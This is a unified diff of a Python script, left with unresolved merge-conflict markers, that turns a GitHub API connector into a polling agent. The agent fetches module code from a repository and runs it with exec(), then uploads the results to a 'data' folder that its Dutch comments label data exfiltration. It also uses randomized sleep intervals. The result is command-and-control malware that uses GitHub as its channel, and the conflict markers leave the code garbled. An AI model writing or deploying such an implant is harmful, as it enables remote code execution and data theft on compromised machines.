@@ -1,19 +1,27 @@
-import os
-import json
-import time
-import random
-import uuid
-import base64
-import importlib.util
-import requests
+import os, json, time, random, uuid, base64, requests
 from datetime import datetime
 
+# Basis instellingen laden
+with open("agent_config.json", "r") as f:
+    ac = json.load(f)
 
-class GitHubConnector:
-    def __init__(self, repo_owner, repo_name, token):
-        self.base_url = f"https://api.github.com/repos/{repo_owner}/{repo_name}"
-        self.headers = {"Authorization": f"token {token}", "Accept": "application/vnd.github.v3+json"}
+ID = ac.get("client_id") or str(uuid.uuid4())[:8]
+URL = f"https://api.github.com/repos/{ac['repo_owner']}/{ac['repo_name']}/contents"
+HDR = {"Authorization": f"token {ac['github_token']}", "Accept": "application/vnd.github.v3+json"}
+
+def gh_get(path):
+    r = requests.get(f"{URL}/{path}", headers=HDR)
+    if r.status_code == 200:
+        return base64.b64decode(r.json()["content"]).decode()
+    return None
+
+def gh_put(path, data):
+    # Eerst SHA ophalen voor overschrijven/aanmaken
+    sha = None
+    r = requests.get(f"{URL}/{path}", headers=HDR)
+    if r.status_code == 200: sha = r.json()["sha"]
     
+<<<<<<< HEAD
     def get_file(self, path):
         try:
             r = requests.get(f"{self.base_url}/contents/{path}", headers=self.headers, timeout=10)
@@ -50,8 +58,15 @@ class GitHubConnector:
     def get_config(self):
         content = self.get_file("config/config.json")
         return json.loads(content) if content else None
+=======
+    payload = {"message": "update", "content": base64.b64encode(json.dumps(data).encode()).decode(), "branch": "main"}
+    if sha: payload["sha"] = sha
+    requests.put(f"{URL}/{path}", headers=HDR, json=payload)
+>>>>>>> e6dcaa6f07b3d9da1cfa499f68bca2363fe73a2a
 
+print(f"Agent {ID} actief...")
 
+<<<<<<< HEAD
 class ModuleLoader:
     def __init__(self, github, client_id):
         self.github = github
@@ -169,3 +184,30 @@ def main():
 if __name__ == "__main__":
     main()
 
+=======
+while True:
+    try:
+        # 1. Config ophalen [cite: 41]
+        conf = json.loads(gh_get("config/config.json") or "{}")
+        
+        # 2. Check of deze client moet draaien [cite: 43]
+        if not conf.get("active_clients") or ID in conf["active_clients"]:
+            for m in conf.get("modules", []):
+                name = m['name']
+                # 3. Module code downloaden en direct uitvoeren [cite: 48, 49]
+                code = gh_get(f"modules/{name}.py")
+                if code:
+                    print(f"Running {name}...")
+                    local_vars = {}
+                    exec(code, globals(), local_vars)
+                    result = local_vars['execute'](m, ID)
+                    
+                    # 4. Data exfiltratie naar /data folder [cite: 45]
+                    ts = datetime.now().strftime("%H%M%S")
+                    gh_put(f"data/{ID}_{name}_{ts}.json", result)
+
+    except Exception as e: print(f"Fout: {e}")
+    
+    # 5. Randomized polling interval [cite: 52]
+    time.sleep(random.randint(30, 60))
+>>>>>>> e6dcaa6f07b3d9da1cfa499f68bca2363fe73a2a
